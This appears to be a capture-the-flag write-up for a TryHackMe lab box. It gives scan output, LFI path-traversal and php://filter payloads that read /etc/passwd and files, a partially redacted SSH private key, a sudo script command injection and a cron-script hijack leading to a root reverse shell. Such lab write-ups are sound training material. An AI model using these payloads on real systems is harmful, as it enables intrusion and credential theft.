@@ -1,0 +1,317 @@
+Team
+
+NMAP RESULTS:
+
+Nmap scan report for 10.10.52.136
+Host is up, received syn-ack (0.18s latency).
+Scanned at 2021-03-07 00:32:12 EST for 14s
+
+PORT   STATE SERVICE REASON  VERSION
+21/tcp open  ftp     syn-ack vsftpd 3.0.3
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRK/xFh/H4lC7shWUUvK9lKxd3VO2OwfsC8LjFEU2CnEUrbVCnzx8jiVp5gO+CVAj63+GXkbIuXpynlQ/4j1dXdVUz/yAZ96cHiCNo6S5ThONoG2g2ObJSviCX2wBXhUJEzW07mRdtx4nesr6XWMj9hwIlSfSBS2iPEiqHfGrjp14NjG6Xmq5hxZh5Iq3dBrOd/ZZKjGsHe+RElAMzIwRK5NwFlE7zt7ZiANrFSy4YD4zerNSyEnjPdnE6/ArBmqOFtsWKZ2p/Wc0oLOP7d6YBwQyZ9yQNVGYS9gDIGZyQCYsMDVJf7jNvRp/3Ru53FMRcsYm5+ItIrgrx5GbpA+LR
+|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBM4d9TCz3FkEBEJ1VMjOsCrxsbS3YGb7mu9WgtnaFPZs2eG4ssCWz9nWeLolFgvHyT5WxRT0SFSv3vCZCtN86I=
+|   256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHUxjoul7JvmqQMtGOuadBwi2mBVCdXhJjoG5x+l+uQn
+80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'team.thm' in your hosts file
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+so add 'team.thm' to /etc/hosts file
+
+GOBUSTER SCANS:
+
+/images (Status: 301)
+/scripts (Status: 301)
+/assets (Status: 301)
+/robots.txt (Status: 200)
+
+in robots.txt:
+dale
+
+maybe a username?
+i tried to bruteforce but dead end
+
+then i fuzz the subdomains(as i done a machine before of this type also) using wfuzz:
+
+┌──(kali㉿kali)-[~/team]
+└─$ wfuzz -c -f sub-fighter -w /usr/share/wordlists/dirb/common.txt -u 'http://team.thm' -H 'Host: FUZZ.team.thm' --hc 404,400 --hw 977
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://team.thm/
+Total requests: 4614
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                
+=====================================================================
+
+000001241:   200        9 L      20 W       187 Ch     "dev"                                                                                                  
+000004531:   200        89 L     220 W      2966 Ch     "www"     
+
+
+we got two subdomains, lets change our hosts file
+
+in the "dev" subdomain the source is exposing some php code:
+
+<html>
+ <head>
+  <title>UNDER DEVELOPMENT</title>
+ </head>
+ <body>
+  Site is being built<a href=script.php?page=teamshare.php </a>
+<p>Place holder link to team share</p>
+ </body>
+</html>
+
+
+maybe local file inclusion?
+
+GET REQUEST:http://dev.team.thm/script.php?page=../../../../../../etc/passwd
+
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false dale:x:1000:1000:anon,,,:/home/dale:/bin/bash gyles:x:1001:1001::/home/gyles:/bin/bash ftpuser:x:1002:1002::/home/ftpuser:/bin/sh ftp:x:110:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin sshd:x:111:65534::/run/sshd:/usr/sbin/nologin 
+
+YES IT IS VULN TO LFI ATTACK!!
+
+after checking it
+'root','gyles' and 'dale' are the username(dale was also in robots.txt)
+
+using the php filter in LFI i got the source code of three php files:
+
+                                                                                                                                                                        
+┌──(kali㉿kali)-[~/team]
+└─$ echo "PGh0bWw+CiA8aGVhZD4KICA8dGl0bGU+VU5ERVIgREVWRUxPUE1FTlQ8L3RpdGxlPgogPC9oZWFkPgogPGJvZHk+CiAgPD9waHAgZWNobyAiU2l0ZSBpcyBiZWluZyBidWlsdCIgPz4KPGEgaHJlZj1zY3JpcHQucGhwP3BhZ2U9dGVhbXNoYXJlLnBocCA8L2E+CjxwPlBsYWNlIGhvbGRlciBsaW5rIHRvIHRlYW0gc2hhcmU8L3A+CiA8L2JvZHk+CjwvaHRtbD4K" | base64 -d
+<html>
+ <head>
+  <title>UNDER DEVELOPMENT</title>
+ </head>
+ <body>
+  <?php echo "Site is being built" ?>
+<a href=script.php?page=teamshare.php </a>
+<p>Place holder link to team share</p>
+ </body>
+</html>
+                                                                                                                                                                        
+┌──(kali㉿kali)-[~/team]
+└─$ echo "PGh0bWw+CiA8aGVhZD4KICA8dGl0bGU+VGVhbSBTaGFyZTwvdGl0bGU+CiA8L2hlYWQ+CiA8Ym9keT4KICA8P3BocCBlY2hvICJQbGFjZSBob2xkZXIgZm9yIGZ1dHVyZSB0ZWFtIHNoYXJlIiA/PgogPC9ib2R5Pgo8L2h0bWw+Cg==" | base64 -d
+<html>
+ <head>
+  <title>Team Share</title>
+ </head>
+ <body>
+  <?php echo "Place holder for future team share" ?>
+ </body>
+</html>
+ 
+┌──(kali㉿kali)-[~/team]
+└─$ echo "Cjw/cGhwICAgCiRmaWxlID0gJF9HRVRbJ3BhZ2UnXTsKICAgaWYoaXNzZXQoJGZpbGUpKQogICB7CiAgICAgICBpbmNsdWRlKCIkZmlsZSIpOwogICB9CiAgIGVsc2UKICAgewogICAgICAgaW5jbHVkZSgidGVhbXNoYXJlLnBocCIpOwogICB9Cj8+Cg==" | base64 -d
+
+<?php   
+$file = $_GET['page'];
+   if(isset($file))
+   {
+       include("$file");
+   }
+   else
+   {
+       include("teamshare.php");
+   }
+?>
+                                                                                                                                                                        
+┌──(kali㉿kali)-[~/team]
+└─$ 
+                                                                                                                                                                       
+i also got the /proc/self/status which conatains the info about the current user like its gui,uid etc:
+
+                                                                                                                                                                        
+┌──(kali㉿kali)-[~/team]
+└─$ echo "TmFtZToJYXBhY2hlMgpVbWFzazoJMDAyMgpTdGF0ZToJUiAocnVubmluZykKVGdpZDoJMTA5NQpOZ2lkOgkwClBpZDoJMTA5NQpQUGlkOgk4MjIKVHJhY2VyUGlkOgkwClVpZDoJMzMJMzMJMzMJMzMKR2lkOgkzMwkzMwkzMwkzMwpGRFNpemU6CTY0Ckdyb3VwczoJMzMgCk5TdGdpZDoJMTA5NQpOU3BpZDoJMTA5NQpOU3BnaWQ6CTgyMgpOU3NpZDoJODIyClZtUGVhazoJICAzMzQzNTYga0IKVm1TaXplOgkgIDMzNDE2NCBrQgpWbUxjazoJICAgICAgIDAga0IKVm1QaW46CSAgICAgICAwIGtCClZtSFdNOgkgICAxMzAwMCBrQgpWbVJTUzoJICAgMTMwMDAga0IKUnNzQW5vbjoJICAgIDQ3MjAga0IKUnNzRmlsZToJICAgIDc5ODQga0IKUnNzU2htZW06CSAgICAgMjk2IGtCClZtRGF0YToJICAgIDYzNzYga0IKVm1TdGs6CSAgICAgMTMyIGtCClZtRXhlOgkgICAgIDYyOCBrQgpWbUxpYjoJICAgNTE0NjAga0IKVm1QVEU6CSAgICAgMzgwIGtCClZtU3dhcDoJICAgICAgIDAga0IKSHVnZXRsYlBhZ2VzOgkgICAgICAgMCBrQgpDb3JlRHVtcGluZzoJMApUaHJlYWRzOgkxClNpZ1E6CTAvMTY4NApTaWdQbmQ6CTAwMDAwMDAwMDAwMDAwMDAKU2hkUG5kOgkwMDAwMDAwMDAwMDAwMDAwClNpZ0JsazoJMDAwMDAwMDAwMDAwMDAwMApTaWdJZ246CTAwMDAwMDAwMDEwMDEwMDAKU2lnQ2d0OgkwMDAwMDAwMThjMDA0ZWVmCkNhcEluaDoJMDAwMDAwMDAwMDAwMDAwMApDYXBQcm06CTAwMDAwMDAwMDAwMDAwMDAKQ2FwRWZmOgkwMDAwMDAwMDAwMDAwMDAwCkNhcEJuZDoJMDAwMDAwM2ZmZmZmZmZmZgpDYXBBbWI6CTAwMDAwMDAwMDAwMDAwMDAKTm9OZXdQcml2czoJMApTZWNjb21wOgkwCkNwdXNfYWxsb3dlZDoJN2ZmZgpDcHVzX2FsbG93ZWRfbGlzdDoJMC0xNApNZW1zX2FsbG93ZWQ6CTAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAwLDAwMDAwMDAxCk1lbXNfYWxsb3dlZF9saXN0OgkwCnZvbHVudGFyeV9jdHh0X3N3aXRjaGVzOgk0MTAKbm9udm9sdW50YXJ5X2N0eHRfc3dpdGNoZXM6CTQwCg" | base64 -d
+Name:	apache2
+Umask:	0022
+State:	R (running)
+Tgid:	1095
+Ngid:	0
+Pid:	1095
+PPid:	822
+TracerPid:	0
+Uid:	33	33	33	33
+Gid:	33	33	33	33
+FDSize:	64
+Groups:	33 
+NStgid:	1095
+NSpid:	1095
+NSpgid:	822
+NSsid:	822
+VmPeak:	  334356 kB
+VmSize:	  334164 kB
+VmLck:	       0 kB
+VmPin:	       0 kB
+VmHWM:	   13000 kB
+VmRSS:	   13000 kB
+RssAnon:	    4720 kB
+RssFile:	    7984 kB
+RssShmem:	     296 kB
+VmData:	    6376 kB
+VmStk:	     132 kB
+VmExe:	     628 kB
+VmLib:	   51460 kB
+VmPTE:	     380 kB
+VmSwap:	       0 kB
+HugetlbPages:	       0 kB
+CoreDumping:	0
+Threads:	1
+SigQ:	0/1684
+SigPnd:	0000000000000000
+ShdPnd:	0000000000000000
+SigBlk:	0000000000000000
+SigIgn:	0000000001001000
+SigCgt:	000000018c004eef
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+NoNewPrivs:	0
+Seccomp:	0
+Cpus_allowed:	7fff
+Cpus_allowed_list:	0-14
+Mems_allowed:	00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001
+Mems_allowed_list:	0
+voluntary_ctxt_switches:	410
+nonvoluntary_ctxt_switches:	40
+base64: invalid input
+
+
+so i can get the user.txt usin the php filter
+
+GET /script.php?page=php://filter/convert.base64-encode/resource=../../../home/dale/user.txt
+┌──(kali㉿kali)-[~/team]
+└─$ echo "VEhNezZZMFRYSHo3YzJkfQo=" | base64 -d                                                                                 
+THM{REDECATED}
+                                                                                                                                                                        
+┌──(kali㉿kali)-[~/team]
+└─$ 
+
+now i use the burp intruder to  bruteforce the files which can be accessed from the LFI request
+so i got a file /etc/ssh/sshd_config in which the ssh privatekey of the user 'dale' is stored
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE
+NUkbi5WUOdR4ock4dFjk03X1bDshaisAFRJJkgUq1+zNJ+p96ZIEKtm93aYy3+YggliN/W
+oG+RPqP8P6/uflU0ftxkHE54H1Ll03HbN+0H4JM/InXvuz4U9Df09m99JYi6DVw5XGsaWK
+o9WqHhL5XS8lYu/fy5VAYOfJ0pyTh8IdhFUuAzfuC+fj0BcQ6ePFhxEF6WaNCSpK2v+qxP
+zMUILQdztr8WhURTxuaOQOIxQ2xJ+zWDKMiynzJ/lzwmI4EiOKj1/nh/w7I8rk6jBjaqAu
+k5xumOxPnyWAGiM0XOBSfgaU+eADcaGfwSF1a0gI8G/TtJfbcW33gnwZBVhc30uLG8JoKS
+xtA1J4yRazjEqK8hU8FUvowsGGls+trkxBYgceWwJFUudYjBq2NbX2glKz52vqFZdbAa1S
+0soiabHiuwd+3N/ygsSuDhOhKIg4MWH6VeJcSMIrAAAFkNt4pcTbeKXEAAAAB3NzaC1yc2
+EAAAGBAJ4OijEx985vuq6nkM5+RywY4K7gfZNq1/13cwq+o73RSyfrh+GVRDVJG4uVlDnU
+eKHJOHRY5NN19Ww7IWorABUSSZIFKtfszSfqfemSBCrZvd2mMt/mIIJYjf1qBvkT6j/D+v
+7n5VNH7cZBxOeB9S5dNx2zftB+CTPyJ177s+FPQ39PZvfSWIug1cOVxrGliqPVqh4S+V0v
+JWLv38uVQGDnydKck4fCHYRVLgM37gvn49AXEOnjxYcRBelmjQkqStr/qsT8zFCC0Hc7a/
+....REDECATED.....
+
+
+dale@TEAM:~$ id
+uid=1000(dale) gid=1000(dale) groups=1000(dale),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare),1003(editors)
+dale@TEAM:~$ 
+
+we are dale now
+as we can see dale is in 'lxd' group ,so we can get root through the lxd privesc also
+
+
+dale@TEAM:~$ sudo -l
+Matching Defaults entries for dale on TEAM:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User dale may run the following commands on TEAM:
+    (gyles) NOPASSWD: /home/gyles/admin_checks
+
+    so lets see whats its in this file and can we edit this?
+
+    -rwxr--r-- 1 gyles editors  399 Jan 15 21:52 admin_checks
+we can see the users in 'editors' group can only read the file
+
+#!/bin/bash
+
+printf "Reading stats.\n"
+sleep 1
+printf "Reading stats..\n"
+sleep 1
+read -p "Enter name of person backing up the data: " name
+echo $name  >> /var/stats/stats.txt
+read -p "Enter 'date' to timestamp the file: " error
+printf "The Date is "
+$error 2>/dev/null
+
+date_save=$(date "+%F-%H-%M")
+cp /var/stats/stats.txt /var/stats/stats-$date_save.bak
+
+printf "Stats have been backed up\n"
+
+as we can see that the 'date' command does'nt use the full path, which can be exploited by changing the path and making our own file with
+the same name and then run this file as the 'gylas'
+
+ANOTHER WAY:
+we can see that this script is '$()' running the command so we can give it as like '/bin/bash' to get the shell as the gylas
+
+dale@TEAM:/home/gyles$ sudo -u gyles /home/gyles/admin_checks
+Reading stats.
+Reading stats..
+Enter name of person backing up the data: test
+Enter 'date' to timestamp the file: /bin/bash
+The Date is 
+id
+uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
+
+YES WE ARE GYLAS NOW!!
+as we can see that this user is in the 'admin' group
+
+now in the /opt direc:
+
+gyles@TEAM:/home$ cat /opt/admin_stuff/script.sh 
+#!/bin/bash
+#I have set a cronjob to run this script every minute
+
+
+dev_site="/usr/local/sbin/dev_backup.sh"
+main_site="/usr/local/bin/main_backup.sh"
+#Back ups the sites locally
+$main_site
+$dev_site
+gyles@TEAM:/home$ 
+
+this file is running in every minute 
+gyles@TEAM:/home$ ls -la /usr/local/sbin/dev_backup.sh 
+-rwxr-xr-x 1 root root 64 Jan 17 19:42 /usr/local/sbin/dev_backup.sh
+
+as we can see we have a file dev_backup.sh but can't write it
+
+
+gyles@TEAM:/opt/admin_stuff$ ls -la /usr/local/bin/main_backup.sh 
+-rwxrwxr-x 1 root admin 65 Jan 17 20:36 /usr/local/bin/main_backup.sh
+gyles@TEAM:/opt/admin_stuff$ 
+
+BUT WE CAN WRITE THIS FILE AS WE ARE IN THE ADMIN GROUP
+SO EDIT THIS FILE WITH THE MALICIOUS CODE
+
+
+listening on [any] 1234 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.113.175] 50436
+bash: cannot set terminal process group (1917): Inappropriate ioctl for device
+bash: no job control in this shell
+root@TEAM:~# cat /root/root.txt
+cat /root/root.txt
+THM{REDECATED}
+root@TEAM:~# 
+
+YES WE ARE ROOT!!
